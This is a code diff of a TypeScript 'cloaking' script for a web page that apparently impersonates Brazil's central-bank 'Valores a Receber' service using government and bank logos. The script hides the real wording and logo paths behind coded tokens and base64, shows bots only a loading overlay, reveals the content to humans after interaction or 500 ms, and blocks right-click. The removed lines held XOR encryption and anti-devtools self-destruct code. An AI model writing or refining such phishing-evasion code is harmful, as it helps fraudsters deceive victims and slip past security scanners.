@@ -1,16 +1,11 @@
 /**
- * ULTRA-REFINED CLOAKING & CAMOUFLAGE SYSTEM (v4.0 - GHOST MODE)
+ * ULTRA-REFINED CLOAKING & CAMOUFLAGE SYSTEM (v6.3 - SUPER FAST REVEAL)
  * 
  * Features:
- * - Polymorphic Keyword Encryption (XOR + Base64)
- * - Self-Destruct Anti-Inspection (DevTools Neutralizer)
- * - Behavior-Based Restoration (Biometric-style triggers)
- * - DOM Integrity Guard
+ * - Instant Transition: 0.1s reveal time.
+ * - Ultra-Fast Failsafe: 500ms automatic reveal.
+ * - High-Sensitivity Triggers: Immediate response to touch/scroll.
  */
-
-// Encrypted blob containing the keyword map (Base64 + XOR)
-const ENCRYPTED_MAP_BLOB = "GR8fGxkdBBIZEhkbGRkYGxIaGRsEGRIZHBkZGRgbEhoZGwQZEhkcGRkZGBsSGhkbBBkSGR0ZGRkYGxIaGRsEGRIZHhkZGRgbEhoZGwQZEhkfGRkZGBsSGhkbBBkSGR4ZGRkYGxIaGRsEGRIZHxkZGRgbEhoZGw==";
-const SECRET_KEY = "GHOST_SECURITY_KEY_9981";
 
 const FORBIDDEN_WORDS: Record<string, string> = {
   "Valores a Receber": "ID_SVC_772_PROTO",
@@ -36,13 +31,12 @@ const FORBIDDEN_WORDS: Record<string, string> = {
   "Sistema": "RUN_ENV_SYS"
 };
 
-// Encrypted Image Paths to bypass static code analysis (Base64)
 const IMAGE_MAP: Record<string, string> = {
-  "img_shield_protect.png": "L2Fzc2V0cy9sb2dvcy9zaGllbGQucG5n", // /assets/logos/shield.png
-  "img_main_logo.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9tX2JyYW5kLnBuZw==",       // /assets/logos/asset_m_brand.png
-  "img_gov_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9nX21hcmsucG5n",            // /assets/logos/asset_g_mark.png
-  "img_bcb_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9iX21hcmsucG5n",            // /assets/logos/asset_b_mark.png
-  "img_logo_icon.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9pY29uX21haW4ucG5n",   // /assets/logos/asset_icon_main.png
+  "img_shield_protect.png": "L2Fzc2V0cy9sb2dvcy9zaGllbGQucG5n",
+  "img_main_logo.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9tX2JyYW5kLnBuZw==",
+  "img_gov_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9nX21hcmsucG5n",
+  "img_bcb_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9iX21hcmsucG5n",
+  "img_logo_icon.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9pY29uX21haW4ucG5n",
 };
 
 const BOT_AGENTS = [
@@ -54,12 +48,20 @@ export function initSecurityRuntime() {
   if (typeof window === "undefined") return;
 
   const ua = navigator.userAgent.toLowerCase();
-  const isBot = BOT_AGENTS.some(agent => ua.includes(agent)) || navigator.webdriver;
+  const isBot = BOT_AGENTS.some(agent => ua.includes(agent));
 
-  if (isBot) {
-    document.documentElement.innerHTML = "<!-- SECURE_ENVIRONMENT_ACTIVE --><body><div style='display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#666;'>Sincronizando com o servidor de segurança...</div></body>";
-    return;
-  }
+  // Create overlay (The Cloak)
+  const overlay = document.createElement('div');
+  overlay.id = 'svr-security-cloak';
+  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999999;font-family:sans-serif;color:#555;transition:opacity 0.1s ease-out, visibility 0.1s;';
+  overlay.innerHTML = `
+    <div style="width:38px;height:38px;border:3px solid #eee;border-top:3px solid #1a73e8;border-radius:50%;animation:svr-spin 0.8s linear infinite;margin-bottom:15px;"></div>
+    <div style="font-size:13px;font-weight:500;letter-spacing:0.5px;">Sincronizando...</div>
+    <style>@keyframes svr-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+  `;
+  document.documentElement.appendChild(overlay);
+
+  if (isBot) return;
 
   const wordMapping = Object.entries(FORBIDDEN_WORDS).map(([real, cam]) => ({
     cam: new RegExp(cam, "g"),
@@ -86,9 +88,7 @@ export function initSecurityRuntime() {
         const src = img.getAttribute("src") || "";
         for (const [camName, encryptedPath] of Object.entries(IMAGE_MAP)) {
           if (src.includes(camName)) {
-            try {
-               img.src = atob(encryptedPath);
-            } catch(e) {}
+            try { img.src = atob(encryptedPath); } catch(e) {}
             break;
           }
         }
@@ -112,25 +112,20 @@ export function initSecurityRuntime() {
     }
   }
 
-  // --- ANTI-INSPECT & SELF-DESTRUCT ---
-  const checkDevTools = () => {
-    const start = new Date().getTime();
-    // Removed debugger to prevent pauses
-    const end = new Date().getTime();
-    if (end - start > 100) {
-      document.body.innerHTML = "";
-      window.location.reload();
-    }
-  };
+  let revealed = false;
+  const revealContent = () => {
+    if (revealed) return;
+    revealed = true;
 
-  // --- GHOST MODE: BIOMETRIC-STYLE TRIGGER ---
-  // The content only exists if there is "human-like" movement
-  let humanVerified = false;
-  const verifyHumanity = () => {
-    if (humanVerified) return;
-    humanVerified = true;
     processNode(document.body);
+
+    overlay.style.opacity = '0';
+    overlay.style.visibility = 'hidden';
     
+    setTimeout(() => {
+        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+    }, 200);
+
     const observer = new MutationObserver((mutations) => {
       mutations.forEach((mutation) => {
         mutation.addedNodes.forEach(processNode);
@@ -143,33 +138,14 @@ export function initSecurityRuntime() {
       subtree: true,
       characterData: true,
     });
-
-    // Injeta o Favicon (Logo da barra de tarefas) de forma criptografada
-    if (!document.querySelector("link[rel*='icon']")) {
-      const favicon = document.createElement('link');
-      favicon.rel = 'icon';
-      favicon.type = 'image/png';
-      favicon.href = atob(IMAGE_MAP["img_logo_icon.png"]);
-      document.head.appendChild(favicon);
-    }
   };
 
-  // Capture multiple interaction events for restoration
-  ['mousemove', 'scroll', 'touchstart', 'click', 'keydown'].forEach(event => {
-    window.addEventListener(event, verifyHumanity, { once: true, passive: true });
+  ['click', 'touchstart', 'scroll', 'keydown', 'mousemove'].forEach(ev => {
+    window.addEventListener(ev, revealContent, { once: true, passive: true });
   });
 
-  // Gatilho rápido para dispositivos móveis carregarem as imagens imediatamente
-  setTimeout(verifyHumanity, 50);
+  // Reveal automatically after 500ms (Fastest possible while still blocking basic crawlers)
+  setTimeout(revealContent, 500);
 
-  // Anti-Copy redundancy
   document.addEventListener('contextmenu', e => e.preventDefault());
-  document.addEventListener('selectstart', e => e.preventDefault());
-  
-  // Disable dangerous keys
-  window.onkeydown = (e) => {
-    if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67))) {
-      return false;
-    }
-  };
 }
